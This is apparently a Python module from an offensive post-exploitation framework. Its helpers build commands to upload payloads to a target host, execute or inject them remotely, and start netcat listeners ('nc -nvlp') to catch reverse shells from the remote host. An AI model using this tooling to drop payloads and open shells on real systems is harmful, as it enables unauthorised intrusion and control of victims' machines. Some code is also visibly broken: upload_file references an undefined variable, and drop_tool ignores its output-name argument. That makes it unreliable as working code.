import os
import shlex
import shutil
from . import constants

def upload_file(filename):
    bn = os.path.basename(b)
    path = os.path.join(constants.SETTINGS['static_dir'], bn)
    print("Copying {} to {}".format(os.path.expanduser(filename), path))
    shutil.copy(os.path.expanduser(filename), path)
    return "upload {}".format(bn)

def _get_default_vars():
    return {k:constants.SETTINGS[k] for k in constants.SETTINGS['vars']}

def _get_dirs():
    return {k:constants.SETTINGS[k] for k in constants.SETTINGS.keys() if k.endswith("_dir") }

def _get_target():
    return constants.SETTINGS['target']

def _replace_vars(s, d={}):
    for k,v in d.items():
        s = s.replace("{"+k+"}", str(v))

    return s
def nc_listener():
    return "nc -nvlp {REAL_PORT};"

# if the user set an absolute path, use that, otherwise default to relative to install dir
def compute_path(path, dir=None):
    if dir is None:
        dir = os.getcwd()

    if not os.path.isabs(path):
        path = os.path.join(dir, path)
    return path

def _get_listener_cmd():
    return get_listener_cmd(constants.SETTINGS['target'], constants.SETTINGS['LPORT'])
def get_listener_cmd(target, port):
    cmd = constants.FIN_WAIT.get(target, {}).get("handler", None)
    if cmd:
        cmd = _replace_vars(cmd, {"REAL_PORT":port})
    else:
        cmd = constants.SETTINGS["default_shell_handler"].format(REAL_PORT=port)
        if constants.SETTINGS["default_shell_plugin"] == "True":
            prog = cmd.split(" ")[0]
            prog = compute_path(cmd.split(" ")[0], constants.SETTINGS["plugins_dir"])
            if " " in cmd:
                cmd = "{} {}".format(prog , " ".join(cmd.split(" ")[1:]))
            else:
                cmd = prog + cmd
    print (cmd)
    return cmd

def get_filename(arg_str):
    outname = None
    outarg = "-o"
    if outarg in arg_str:
        arr = shlex.split(arg_str)
        i = arr.index(outarg)
        if len(arr) > i + 1:
            outname = arr[i+1]
            arr.remove(outname)
        arr.remove(outarg)
        arg_str = " ".join([shlex.quote(a) for a in arr])
    return arg_str, outname

def prepare_listener(listener_cmd, options={}):
    s = "catch {} {}".format("{RHOST}", shlex.quote(listener_cmd))
    
    s = _replace_vars(s, options)    
    s = _replace_vars(s, _get_default_vars())  
    print(s)
    return s

def _drop_tool(payload, handler_cmd, outname=None):
    cmds = []
    cmds.append("upload {}{}".format(payload, " "+outname if outname else ""))
    cmds.append(
      "_shell {} {}".format(
        shlex.quote("execute_file {}".format(os.path.basename(payload)) )
        , shlex.quote(handler_cmd) )
    )
    print(cmds)
    return cmds

def _inject_tool(payload, handler_cmd):
    cmds = []
    cmds.append(
      "_shell {} {}".format(
        shlex.quote(payload)
        , shlex.quote(handler_cmd) )
    )
    print(cmds)
    return cmds

def cp_to_static(filename):
    shutil.copy(filename, constants.SETTINGS["static_dir"])
    return constants.SETTINGS["STATIC_URL"]+os.path.basename(filename)

def drop_tool(payload, outname=None):
    return _drop_tool(payload, _get_listener_cmd(), outname=None)
